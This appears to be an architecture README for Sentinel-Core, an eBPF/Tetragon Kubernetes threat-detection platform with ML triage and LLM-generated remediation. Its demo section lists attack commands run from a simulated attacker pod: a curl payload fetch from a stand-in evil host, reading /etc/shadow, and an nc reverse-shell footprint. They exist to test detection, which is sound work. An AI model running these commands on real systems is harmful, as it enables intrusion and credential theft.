# Sentinel-Core: Complete System Workflow & Architecture

Sentinel-Core is a closed-loop security platform powered by eBPF (Extended Berkeley Packet Filter) for real-time kernel-level threat detection in Kubernetes environments. The system acts as "The Muscle", identifying suspicious activities, triaging them using an ML model, and leveraging a RAG-powered LLM Orchestrator for automated incident reporting and remediation generation.

## High-Level Architecture

The platform's architecture is divided into the following primary layers:

1.  **Data Plane (Kernel Level)**: Tetragon eBPF agents monitoring Kubernetes nodes.
2.  **Event Forwarder & Triage**: Python service that standardizes events and grades them via an ML model.
3.  **Analytics & Remediation Engine**: A LangGraph orchestrator using Pinecone RAG and Gemini LLM.
4.  **Presentation Layer**: A React/Vite dashboard for visualization and administrative control.

---

## Complete Workflow Diagram

The system's end-to-end data flow operates as follows:

```mermaid
flowchart TD
    %% Define styles
    classDef k8s fill:#326ce5,stroke:#fff,color:#fff;
    classDef ebpf fill:#f4c20d,stroke:#fff,color:#000;
    classDef python fill:#3776ab,stroke:#fff,color:#fff;
    classDef redis fill:#d82c20,stroke:#fff,color:#fff;
    classDef ai fill:#00a36c,stroke:#fff,color:#fff;
    classDef db fill:#003b5c,stroke:#fff,color:#fff;
    classDef ui fill:#61dafb,stroke:#fff,color:#000;

    subgraph Kubernetes Cluster
        A1[K8s Worker Node 1] ::: k8s
        A2[K8s Worker Node 2] ::: k8s
        
        T1[Tetragon eBPF Daemon] ::: ebpf
        T2[Tetragon eBPF Daemon] ::: ebpf
        
        A1 --> T1
        A2 --> T2
    end

    TetragonGRPC[Tetragon gRPC / Stdout] ::: ebpf
    T1 -.-> TetragonGRPC
    T2 -.-> TetragonGRPC

    subgraph Event Forwarder
        FWD[Python Event Forwarder] ::: python
        ML[Local ML Classifier] ::: ai
        Transform[Schema Transformer] ::: python
        
        TetragonGRPC --> FWD
        FWD --> Transform
        Transform --> ML
        ML -->|Tags event as: TP, FP, BP with Confidence| FWD
    end

    Redis[Redis Events Stream] ::: redis
    FWD -->|Pushes Graded JSON| Redis

    subgraph LangGraph Orchestrator
        Orch[Orchestrator] ::: python
        NodeA{Node A: Event Router} ::: python
        NodeB[Node B: Pinecone RAG] ::: ai
        NodeC[Node C: Gemini LLM Report] ::: ai
        
        Pinecone[(Pinecone Vector DB<br>MITRE & Azure Data)] ::: db
        
        Redis --> Orch
        Orch --> NodeA
        NodeA -->|If TP or BP| NodeB
        NodeA -->|If FP| Suppress(Auto-Suppressed)
        
        NodeB <-->|Retrieves Context| Pinecone
        NodeB --> NodeC
        NodeC -->|Generates YAML Fix & Incident Report| Out[Sentinel API Response]
    end

    subgraph Next-Gen Dashboard
        React[React / Vite Dashboard] ::: ui
        WS[WebSocket Stream] ::: python
        REST[FastAPI REST API] ::: python
        
        Out --> REST
        Redis -.-> WS
        WS --> React
        REST <--> React
    end
```

---

## Step-by-Step Security Pipeline Workflow

### 1. Ingestion of Knowledge Base (Offline Preparation)
Prior to analyzing any attacks, the system ingests cybersecurity domain knowledge into a vector database:
*   **Script**: `ingest.py`
*   **Process**: It processes the `enterprise-attack.json` (MITRE ATT&CK Framework) and the `CIS_Microsoft_Azure_Foundations_Benchmark.pdf`.
*   **Vectors**: The data is partitioned into chunks, embedded using a local HuggingFace `sentence-transformers` model, and pushed to **Pinecone (V3)** namespaces (`mitre` and `azure`). 

### 2. eBPF Sensor Deployment
*   **Tetragon DaemonSet**: Tetragon agents are deployed to each Node in the K8s cluster.
*   **Policies**: Custom TracingPolicies (e.g., `trace-execve.yaml`, `sentinel-full.yaml`) are applied to the cluster. These instruct Tetragon to monitor security-sensitive kernel functions (e.g., specific syscalls like `execve`, or network `connect` calls) while filtering irrelevant system noise.

### 3. Event Forwarding and Transformation
*   **Script**: `forwarder/main.py`
*   **Process**: Tetragon pushes kernel events to the Python Forwarder via gRPC (or via `tetra CLI` stdout for offline demo modes).
*   **Normalization**: The raw kernel event is converted into a unified Sentinel JSON Schema (extracting PID, binary, arguments, User ID, Namespace, Pod name, etc.).

### 4. Zero-Latency ML Triage
*   **Script**: `forwarder/ml_triage.py`
*   **Process**: Before the event is streamed or analyzed deeply, a lightweight, local ML triage engine infers the severity of the event.
*   **Output**: It appends a grade to the event (`TP` = True Positive, `BP` = Benign Positive, `FP` = False Positive) and a confidence score (`0.0 - 1.0`).

### 5. Orchestration & LLM Processing (LangGraph)
*   **Script**: `orchestrator.py`
*   **Trigger**: If an event generates an alert grade of `TP` or high-confidence `BP`, it invokes the orchestrator pipeline.
*   **Node A (Router)**: Discards False Positives to save computational overhead.
*   **Node B (RAG Retriever)**: Takes the suspicious `process` and `syscall` and runs a semantic search on Pinecone to pull the relevant MITRE ATT&CK definitions and Azure specific benchmarks.
*   **Node C (Report Generator)**: Feeds the system prompts, raw event, MITRE technique context, and Azure guidelines into the **Gemini 2.5 Pro LLM**.
*   **Outputs generated by Gemini**:
    1.  A summarized Incident Report.
    2.  Extracted Attack Types & Potential Impact.
    3.  A highly contextual **Kubernetes Object Patch (YAML Fix)** to mitigate the threat (e.g., A NetworkPolicy restricting egress, or a restrictive PodSecurityContext update).

### 6. Security Dashboard Monitoring
*   **Stack**: React, Vite, Framer Motion (`dashboard/`).
*   **Process**: The frontend interface connects via WebSockets to visually display events in real-time.
*   **Elements**: It shows the Incident Ledger, Syscall Ticker, Cluster Immunity Score, Forensics Panel, and allows admins to view the generated mitigation YAML and immediately dispatch the remediation scripts to the cluster.

---

## Deployment & Demonstration Workflow

From an operations standpoint, launching the complete pipeline locally is automated:

1.  **Virtual Env setup**: `make install` installs Python dependencies.
2.  **Cluster Provisioning**: `start_app.sh` (or `make up`) creates a 3-node localized `kind` Kubernetes cluster, attaches host debug/trace filesystems, and installs the Tetragon agent.
3.  **Attacker Simulation**: It spins up an `attacker-pod` (using an alpine/curl image) and forcefully triggers multiple true-positive attacks such as downloading remote payloads (`curl -sk http://evil.example`), reading secrets (`cat /etc/shadow`), attempting a reverse shell footprint (`nc 10.0.0.99 4444`), and DNS exfiltration.
4.  **Live Monitoring**: The system successfully catches these footprints from ring-0 kernel space, triggers the pipeline, generates the LLM reports, and serves them to the UI dashboard.
